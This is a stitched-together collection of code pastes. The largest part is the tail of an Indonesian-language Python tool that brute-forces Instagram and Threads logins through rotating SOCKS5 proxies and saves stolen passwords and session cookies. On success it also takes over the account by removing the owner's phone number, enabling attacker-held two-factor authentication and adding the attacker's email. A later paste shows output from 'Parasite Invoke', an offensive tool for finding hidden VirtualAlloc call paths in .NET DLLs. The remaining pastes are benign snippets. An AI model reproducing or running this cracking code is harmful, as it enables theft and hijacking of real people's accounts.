                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        
"
i1qg4Azf,Air AI Post template,updown,JavaScript,Thursday 7th of March 2024 03:26:47 PM CDT,"let Timestamp = new Date().toISOString(); // creates a Timestamp
let Webhook = ""https://api.air.ai/v1/calls"";
let Method = ""POST"";
const token = ""YOUR_VALUE_HERE""

// creates the JSON Object to send with the key/value pairs
const payload = {
  ""promptId"": YOUR_NUMBER_HERE,
  ""phone"": inputData.phoneNumber,
  ""name"": inputData.name
};


// creates the Method, Headers, and Body of the HTTP POST Request
let Options = {
     method: Method,
     headers: {
          'Content-Type': ""application/json"",
          ""Authorization"": ""Bearer "" + token
     },
     body: JSON.stringify(payload)
}

const Request = await fetch(Webhook, Options); // HTTP POST Request
const Response = await Request.json(); // HTTP POST Response

output = {Response, Request, Webhook, Method, Timestamp}"
e0YwbmHr,Untitled,smj007,Python,Thursday 7th of March 2024 03:15:52 PM CDT,"class RandomizedCollection:

    def __init__(self):
        self.hashmap = defaultdict(set)
        self.list = []
        
    def insert(self, val: int) -> bool:

        self.hashmap[val].add(len(self.list))
        self.list.append(val)
        return len(self.hashmap[val]) == 1
        
    def remove(self, val: int) -> bool:
        if self.hashmap[val]:
            indexes = self.hashmap[val]
            index = indexes.pop()
           
            last = self.list[-1]
            self.list[index] = last

            self.hashmap[last].add(index)
            self.hashmap[last].remove(len(self.list)-1)

            self.list.pop()
            return True
        return False

    def getRandom(self) -> int:
        return random.choice(self.list)
        


# Your RandomizedCollection object will be instantiated and called as such:
# obj = RandomizedCollection()
# param_1 = obj.insert(val)
# param_2 = obj.remove(val)
# param_3 = obj.getRandom()"
EbLXM5nf,class House,miklik,Python,Thursday 7th of March 2024 02:47:29 PM CDT,"# Knihovny
import turtle

# Screen
screen = turtle.Screen()
screen.title(""Turtle OOP"")
screen.setup(1.0,1.0)
print(screen.screensize())

# Želva
t = turtle.Turtle()
t.shape(""turtle"")

# Třída House
class House:
  '''
  Nakresli domek
  '''
  def __init__(self,zelva,sirka=75,x=0,y=0,color=""black""):
    self.zelva = zelva
    self.sirka = sirka
    self.x = x
    self.y = y
    self.color = color
  
  def draw(self,zelva,sirka=75,x=0,y=0,color=""black""):
    self.zelva = zelva
    self.sirka = sirka
    if x != 0: self.x = x
    if y != 0: self.y = y
    self.color = color
    zelva.penup()
    zelva.setx(self.x)
    zelva.sety(self.y)
    zelva.pendown()
    zelva.pencolor(color)
    for i in range(4):
      zelva.forward(sirka)
      zelva.right(90)
    zelva.left(45)
    zelva.forward(53)
    zelva.right(90)
    zelva.forward(53)
    zelva.left(45)
    zelva.penup()

# Instance
house1 = House(t)
house2 = House(t)

# Kreslení
house1.draw(t)
t.forward(50)
house2.draw(t,x=100)

# Bez konce
screen.mainloop()

"
WR3uzEAY,# tk_centralizing_art.py,here2share,Python,Thursday 7th of March 2024 02:43:56 PM CDT,"# tk_centralizing_art.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 600
WINDOW_HEIGHT = 600
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 400
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 100
SPEED = 1

def offset(t=1.5):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

root = tk.Tk()
root.title(""tk_centralizing_art"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

P = 200
def start(event=0):
    global entities
    entities = [(random.randint(-P, WINDOW_WIDTH + P), random.randint(-P, WINDOW_HEIGHT + P), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(-P, WINDOW_WIDTH + P), random.randint(-P, WINDOW_HEIGHT + P), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(-P, WINDOW_WIDTH + P), random.randint(-P, WINDOW_HEIGHT + P), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	# draw.rectangle((0, 0, WINDOW_WIDTH, WINDOW_HEIGHT), fill='white')

	for j in '.'*P:
		for i, (x, y, entity) in enumerate(entities):
			x0, y0 = CX, CY
			if_rev = math.pi
			x, y = movement(x, y, x0, y0)
			draw_entity(x, y, entity)
			entities[i] = (x, y, entity)

		photo_image = ImageTk.PhotoImage(pil_image)

		canvas.create_image(0, 0, anchor='nw', image=photo_image)
		root.update()
	start()"
8wdDVSV3,news_site,Radoslav_03,MySQL,Thursday 7th of March 2024 02:41:42 PM CDT,"CREATE DATABASE newsDB;
USE newsDB;

CREATE TABLE news_categories (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
	name VARCHAR(200)
);

CREATE TABLE news (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(100) NOT NULL,
    content TEXT NOT NULL,
    publish_date DATE NOT NULL,
    
    category_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY(category_id) REFERENCES news_categories(id)
);

CREATE TABLE images (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    url TEXT NOT NULL,
    
    news_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY (news_id) REFERENCES news(id)
);

CREATE TABLE videos (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    url TEXT NOT NULL,
    
    news_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY (news_id) REFERENCES news(id)
);

CREATE TABLE users (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    password VARCHAR(200) NOT NULL,
    role ENUM(""Admin"", ""Editor"", ""Reader"")
);

CREATE TABLE users_news (
	user_id INT UNIQUE NOT NULL,
    news_id INT UNIQUE NOT NULL,
    
    CONSTRAINT FOREIGN KEY(user_id) REFERENCES users(id),
    CONSTRAINT FOREIGN KEY(news_id) REFERENCES news(id),
    PRIMARY KEY(user_id, news_id)
);

CREATE TABLE comments (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    content TEXT NOT NULL,
    published_date DATE NOT NULL,
    
    news_id INT UNIQUE NOT NULL,
    user_id INT UNIQUE NOT NULL,
    
    CONSTRAINT FOREIGN KEY(news_id) REFERENCES news(id),
    CONSTRAINT FOREIGN KEY(user_id) REFERENCES users(id)
);

CREATE TABLE user_activity (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    user_action ENUM(""Login"", ""Comment"", ""Delete account""),
    timestampp TIMESTAMP,
    
    user_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY(user_id) REFERENCES users(id)
);"
iBeTbXCw,Untitled,AttackingDirectory,Bash,Thursday 7th of March 2024 02:35:19 PM CDT,"PS A:\SSD\ProjectsVS\Parasite Invoke\Parasite Invoke\bin\Debug> & '.\Parasite Invoke.exe' --path C:\ -r --method VirtualAlloc


     . .  .  .  . . .
   .                  .                  _.-/`/`'-._
   . Nice assembly :D .                /_..--''''_-'
    .  .  .  .      .`                //-.__\_\.-'
                `..'  _\\\//  --.___ // ___.---.._
                  _- /@/@\  \       ||``          `-_
                .'  ,\_\_/   |    \_||_/      ,-._   `.
               ;   { o    /   }     ""        `-._`.   ;
              ;     `-==-'   /                    \_|   ;
             |        |>o<|  }@@@}                       |
             |       <(___<) }@@@@}                      |
             |       <(___<) }@@@@@}                     |
             |        <\___<) \_.?@@}                    |
              ;         V`--V`__./@}                    ;
               \      tx      ooo@}                    /
                \                                     /
                 `.                                 .'
                   `-._          Parasite Invoke_.-'
                       ``------'''''''''------``


                Michael Zhmaylo (github.com/MzHmO)
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\UIAutomationClientSideProviders.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\UIAutomationClientSideProviders.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr address, UIntPtr size, int allocationType, int protect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\WindowsBase.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\WindowsBase.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr lpAddress, UIntPtr dwSize, int flAllocationType, int flProtect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\UIAutomationClientSideProviders.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\UIAutomationClientSideProviders.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr address, UIntPtr size, int allocationType, int protect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\WindowsBase.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\WindowsBase.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr lpAddress, UIntPtr dwSize, int flAllocationType, int flProtect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\UIAutomationClientSideProviders.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\UIAutomationClientSideProviders.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr address, UIntPtr size, int allocationType, int protect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\WindowsBase.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\WindowsBase.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr lpAddress, UIntPtr dwSize, int flAllocationType, int flProtect });
        ===END SIGNATURE===
-------------"
Cxs3S7sr,Untitled,Abdula_2314124,C#,Thursday 7th of March 2024 02:32:41 PM CDT,"using System;

namespace Metho
{
    class Program
    {
        static void Main(string[] args)
        {
            Reload(10);
        }

        // максКількість патронів - i = кількість патронів яка залишилися до повної перезарядки
        static void Reload(int countPatron)
        {
            for (int i = 0; i < countPatron; i++)
            {
                Console.WriteLine($""Залишилось {countPatron - i} патронів"");
                Console.WriteLine($""Теперешня кількість патронів {i}"");
            }

            Console.WriteLine(""Перезарядка закінчена"");
        }
    }
}
"
